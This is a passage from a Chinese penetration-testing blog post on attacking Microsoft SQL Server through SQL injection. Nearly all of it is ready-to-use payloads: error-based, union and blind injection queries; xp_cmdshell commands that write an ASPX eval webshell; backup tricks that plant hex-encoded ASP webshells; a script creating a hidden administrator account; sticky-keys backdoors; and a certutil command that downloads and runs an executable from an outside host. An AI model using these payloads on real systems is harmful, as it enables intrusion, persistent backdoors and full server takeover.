+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在将 varchar 值 &#x27;81FAAEN52MA16VBYT4Y1JJ3552BTC1640E7CF84345C86BA6&#x27; 转换成数据类型 int 时失败。</span><br></pre></td></tr></table></figure>
+<p>当然，在mssql中也存在<code>INFORMATION_SCHEMA</code>，你也可以通过它来查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from INFORMATION_SCHEMA.TABLES</span><br><span class="line">select * from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=&#x27;admin&#x27;</span><br><span class="line">and 1=(select top 1 table_name from information_schema.tables);--</span><br></pre></td></tr></table></figure>
+<p>判断表名更方便的一种方式是使用<code>having 1=1</code>，<code>GROUP BY</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 having 1=1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选择列表中的列 &#x27;Fanmv_Admin.AdminID&#x27; 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</span><br></pre></td></tr></table></figure>
+<p>爆出一列，将其用group by 拼接进去继续往后爆其他的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID having 1=1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选择列表中的列 &#x27;Fanmv_Admin.IsSystem&#x27; 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID,IsSystem having 1=1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选择列表中的列 &#x27;Fanmv_Admin.AdminName&#x27; 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</span><br></pre></td></tr></table></figure>
+<p>以此爆出所有字段</p>
+<h3 id="报错注入"><a class="markdownIt-Anchor" href="#报错注入"></a> 报错注入</h3>
+<p>其实基本注入流程中用到的就是报错注入，mssql中没有报错函数，报错注入利用的就是显式或隐式的类型转换来报错</p>
+<p>隐式报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id =1 and (select user)&gt;0</span><br></pre></td></tr></table></figure>
+<p>user和0进行比较时就会报错</p>
+<p>再来看显示报错，一般上显示报错用到的是<code>cast</code>和<code>convert</code>函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id =1 (select CAST(USER as int))</span><br><span class="line">select * from admin where id =1 (select convert(int,user))</span><br></pre></td></tr></table></figure>
+<p>这里再来引入一个<code>declare</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id =1;declare @a varchar(2000) set @a=&#x27;select convert(int,user)&#x27; exec(@a);</span><br></pre></td></tr></table></figure>
+<p><code>declare</code>定义变量 <code>set</code>赋值<code>exec</code>执行</p>
+<h3 id="联合查询注入"><a class="markdownIt-Anchor" href="#联合查询注入"></a> 联合查询注入</h3>
+<p>mssql不用数字占位，因为可能会发生隐式转换，我们<strong>用null来占位</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users where id=1 union select null,null,DB_NAME();</span><br></pre></td></tr></table></figure>
+<p>也可以这样来联合报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users where id=1 union select null,null, (select CAST(db_name() as int))</span><br></pre></td></tr></table></figure>
+<h3 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注"></a> 布尔盲注</h3>
+<p>截取字符串比较</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users where id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1))=109</span><br></pre></td></tr></table></figure>
+<h3 id="时间盲注"><a class="markdownIt-Anchor" href="#时间盲注"></a> 时间盲注</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users where id=1;if (select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;))=1 WAITFOR DELAY &#x27;0:0:5&#x27;</span><br></pre></td></tr></table></figure>
+<p><code>waitfor delay '0:0:5'</code>是mssql的延时语法</p>
+<p>同样可以用字符串截取来延时注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY &#x27;0:0:5&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="getshell"><a class="markdownIt-Anchor" href="#getshell"></a> getshell</h2>
+<p>能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。当然你如果有其他具有do_owner权限的用户也可以。</p>
+<p>拿shell的两大前提就是</p>
+<ol>
+<li><strong>有相应的权限db_owner</strong></li>
+<li><strong>知道web目录的绝对路径</strong></li>
+</ol>
+<p>我们先来了解下怎么去寻找web目录的绝对路径。</p>
+<h3 id="寻找绝对路径"><a class="markdownIt-Anchor" href="#寻找绝对路径"></a> 寻找绝对路径</h3>
+<p>通常通过以下方法：</p>
+<ol>
+<li>报错信息</li>
+<li>字典猜</li>
+<li>旁站的目录</li>
+<li>存储过程来搜索</li>
+<li>读配置文件</li>
+</ol>
+<p>前三种方法都是比较常见的方法，主要讲第四种调用存储过程来搜索。</p>
+<p>在mssql中有两个存储过程可以帮我们来找绝对路径：<code>xp_cmdshell xp_dirtree</code></p>
+<p>先来看<code>xp_dirtree</code>直接举例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; --列出所有c:\文件、目录、子目录 </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1 --只列c:\目录</span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1,1 --列c:\目录、文件</span><br></pre></td></tr></table></figure>
+<p>当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tmp (dir varchar(8000),num int,num1 int);</span><br><span class="line">insert into tmp(dir,num,num1) execute master..xp_dirtree &#x27;c:&#x27;,1,1;</span><br></pre></td></tr></table></figure>
+<p>我们再来看<code>xp_cmdshell</code>怎么去找绝对路径，实际上原理就是调用cmd来查找文件，相对来说这种方法更方便。</p>
+<p>当然你可能遇到xp_cmdshell不能调用 如果报错</p>
+<blockquote>
+<p>SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用。</p>
+</blockquote>
+<p>可以用如下命令恢复</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;EXEC sp_configure &#x27;show advanced options&#x27;,1;//允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;  //打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;--</span><br></pre></td></tr></table></figure>
+<p>当然还不行可能xplog70.dll需要恢复，看具体情况来解决吧</p>
+<p>接下来我们先来看cmd中怎么查找文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Y4er&gt;for /r e:\ %i in (1*.php) do @echo %i</span><br><span class="line">e:\code\php\1.php</span><br><span class="line">C:\Users\Y4er&gt;</span><br></pre></td></tr></table></figure>
+<p>那么我们只需要建立一个表 存在一个char字段就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.130.137/1.aspx?id=1;CREATE TABLE cmdtmp (dir varchar(8000));</span><br><span class="line"></span><br><span class="line">http://192.168.130.137/1.aspx?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell &#x27;for /r c:\ %i in (1*.aspx) do @echo %i&#x27;</span><br></pre></td></tr></table></figure>
+<p>然后通过注入去查询该表就可以了。</p>
+<p>此时我们拿到绝对路径之后，我们接着往下看怎么拿shell</p>
+<h3 id="xp_cmdshell拿shell"><a class="markdownIt-Anchor" href="#xp_cmdshell拿shell"></a> xp_cmdshell拿shell</h3>
+<p>xp_cmdshell这个存储过程可以用来执行cmd命令，那么我们可以通过cmd的echo命令来写入shell，当然前提是你知道web目录的绝对路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell &#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\404.aspx&#x27; ;</span><br></pre></td></tr></table></figure>
+<p>由于cmd写webshell的主意这些转义的问题 推荐使用certutil或者vbs什么的来下载</p>
+<h3 id="差异备份拿shell"><a class="markdownIt-Anchor" href="#差异备份拿shell"></a> 差异备份拿shell</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. backup database 库名 to disk = &#x27;c:\bak.bak&#x27;;--</span><br><span class="line"></span><br><span class="line">2. create table [dbo].[test] ([cmd] [image]);</span><br><span class="line"></span><br><span class="line">3. insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)</span><br><span class="line"></span><br><span class="line">4. backup database 库名 to disk=&#x27;C:\d.asp&#x27; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure>
+<p>因为权限的问题，最好不要备份到盘符根目录</p>
+<p>当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用定义局部变量来执行。</p>
+<h3 id="log备份拿shell"><a class="markdownIt-Anchor" href="#log备份拿shell"></a> log备份拿shell</h3>
+<p>LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. alter database 库名 set RECOVERY FULL </span><br><span class="line"></span><br><span class="line">2. create table cmd (a image) </span><br><span class="line"></span><br><span class="line">3. backup log 库名 to disk = &#x27;c:\xxx&#x27; with init </span><br><span class="line"></span><br><span class="line">4. insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) </span><br><span class="line"></span><br><span class="line">5. backup log 库名 to disk = &#x27;c:\xxx\2.asp&#x27;</span><br></pre></td></tr></table></figure>
+<p>log备份的好处就是备份出来的webshell的文件大小非常的小</p>
+<h2 id="提权-getsystem"><a class="markdownIt-Anchor" href="#提权-getsystem"></a> 提权-getsystem</h2>
+<h3 id="xp_cmdshell"><a class="markdownIt-Anchor" href="#xp_cmdshell"></a> xp_cmdshell</h3>
+<p>在2005中xp_cmdshell的权限是system，2008中是network。</p>
+<p>当遇到无法写shell，或者是站库分离的时候，直接通过xp_cmdshell来下载我们的payload来上线会更加方便。下载文件通常有下面几种姿势</p>
+<ol>
+<li>certutil</li>
+<li>vbs</li>
+<li>bitsadmin</li>
+<li>powershell</li>
+<li>ftp</li>
+</ol>
+<p>通过下载文件之后用xp_cmdshell来执行我们的payload，通过Cobalt Strike来进行下一步操作，比如怼exp或许会更加方便。</p>
+<p>常用工具有MDUT</p>
+<h3 id="sp_oacreate"><a class="markdownIt-Anchor" href="#sp_oacreate"></a> sp_oacreate</h3>
+<p>当xp_cmdshell 被删除可以使用这个来提权试试,恢复sp_oacreate</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 0;</span><br></pre></td></tr></table></figure>
+<p>sp_oacreate是一个非常危险的存储过程可以删除、复制、移动文件 还能配合sp_oamethod 来写文件执行cmd</p>
+<p>在以前的系统有这几种用法</p>
+<p><strong>调用cmd 来执行命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wscript.shell执行命令</span><br><span class="line"></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c xxx&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Shell.Application执行命令</span><br><span class="line">declare @o int</span><br><span class="line">exec sp_oacreate &#x27;Shell.Application&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;ShellExecute&#x27;,null, &#x27;cmd.exe&#x27;,&#x27;cmd /c net user &gt;c:\test.txt&#x27;,&#x27;c:\windows\system32&#x27;,&#x27;&#x27;,&#x27;1&#x27;;</span><br></pre></td></tr></table></figure>
+<p><strong>写入启动项</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">declare @sp_passwordxieo int, @f int, @t int, @ret int</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @sp_passwordxieo out</span><br><span class="line">exec sp_oamethod @sp_passwordxieo, &#x27;createtextfile&#x27;, @f out, &#x27;d:\RECYCLER\1.vbs&#x27;, 1</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)&#x27;</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName&#x27;</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;Set ob=GetObject(os)&#x27;</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;)&#x27;</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;Set od=ob.Create(&quot;user&quot;,&quot;123$&quot;)&#x27;</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;od.SetPassword &quot;123&quot;&#x27;</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;od.SetInfo&#x27;</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;Set of=GetObject(os&amp;&quot;/123$&quot;,user)&#x27;</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;oe.add os&amp;&quot;/123$&quot;&#x27;;</span><br></pre></td></tr></table></figure>
+<p><strong>粘贴键替换</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">declare @o int</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;c:\windows\explorer.exe&#x27; ,&#x27;c:\windows\system32\sethc.exe&#x27;;</span><br><span class="line">declare @o int</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;c:\windows\system32\sethc.exe&#x27; ,&#x27;c:\windows\system32\dllcache\sethc.exe&#x27;;</span><br></pre></td></tr></table></figure>
+<p>大家可以灵活运用，这里也可以这样玩，把他写成vbs或者其他的来下载文件 ，为什么不直接调用cmd来下载，再2008系统上我是不成功的，但是sp_oacreate可以启动这个文件，所以换个思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">declare @sp_passwordxieo int, @f int, @t int, @ret int;</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @sp_passwordxieo out;</span><br><span class="line">exec sp_oamethod @sp_passwordxieo, &#x27;createtextfile&#x27;, @f out, &#x27;c:\www\1.bat&#x27;, 1;</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;@echo off&#x27;;</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;start cmd /k &quot;cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&quot;&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\www\1.bat&#x27;</span><br><span class="line"></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\www\file.exe&#x27;</span><br></pre></td></tr></table></figure>
+<p>当然这里只是一种思路，完全可以用vbs来下载什么的</p>
+<h3 id="沙盒提权"><a class="markdownIt-Anchor" href="#沙盒提权"></a> 沙盒提权</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line"></span><br><span class="line">2. exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;, &#x27;SandBoxMode&#x27;</span><br><span class="line"></span><br><span class="line">3. Select * From OpenRowSet(&#x27;Microsoft.Jet.OLEDB.4.0&#x27;,&#x27;;Databasec:\windows\system32\ias\ias.mdb&#x27;,&#x27;select shell( net user itpro gmasfm /add )&#x27;);</span><br></pre></td></tr></table></figure>
+<p>引用前辈们的话</p>
+<blockquote>
+<p>1，Access可以调用VBS的函数，以System权限执行任意命令 2，Access执行这个命令是有条件的，需要一个开关被打开 3，这个开关在注册表里 4，SA是有权限写注册表的 5，用SA写注册表的权限打开那个开关 6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令</p>
+</blockquote>
+<h3 id="xp_regwrite"><a class="markdownIt-Anchor" href="#xp_regwrite"></a> xp_regwrite</h3>
+<p>修改注册表 来劫持粘贴键 当然在2008数据库是不成立的 因为默认权限很低</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution</span><br><span class="line">Options\sethc.EXE&#x27;,&#x27;Debugger&#x27;,&#x27;REG_SZ&#x27;,&#x27;C:\WINDOWS\explorer.exe&#x27;;</span><br></pre></td></tr></table></figure>
+<p>mssql众多的储存过程是我们利用的关键，还有很多可能没被提出，需要自己的发现，比如在遇到iis6的拿不了shell还有个上传可以跳目录，不妨试试xp_create_subdir建立个畸形目录解析。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/175514388679175514388612.jpg" data-sizes="auto" alt="[代码审计]RuoYi-V4.7.9" class="lazyload">
+          
+        
+        <a href="/2026/06/26/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5DRuoYi-V4.7.9/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [代码审计]RuoYi-V4.7.9
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/17369576223624.jpg" data-sizes="auto" alt="破阵阁-渗透实战挑战赛" class="lazyload">
+        
+      
+      <a href="/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          破阵阁-渗透实战挑战赛
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> MSSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 基础信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7"><span class="toc-number">1.2.</span> <span class="toc-text"> 符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text"> 基本注入流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text"> 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text"> 联合查询注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.</span> <span class="toc-text"> 布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.</span> <span class="toc-text"> 时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">2.</span> <span class="toc-text"> getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-number">2.1.</span> <span class="toc-text"> 寻找绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp_cmdshell%E6%8B%BFshell"><span class="toc-number">2.2.</span> <span class="toc-text"> xp_cmdshell拿shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD%E6%8B%BFshell"><span class="toc-number">2.3.</span> <span class="toc-text"> 差异备份拿shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log%E5%A4%87%E4%BB%BD%E6%8B%BFshell"><span class="toc-number">2.4.</span> <span class="toc-text"> log备份拿shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-getsystem"><span class="toc-number">3.</span> <span class="toc-text"> 提权-getsystem</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp_cmdshell"><span class="toc-number">3.1.</span> <span class="toc-text"> xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sp_oacreate"><span class="toc-number">3.2.</span> <span class="toc-text"> sp_oacreate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.</span> <span class="toc-text"> 沙盒提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp_regwrite"><span class="toc-number">3.4.</span> <span class="toc-text"> xp_regwrite</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
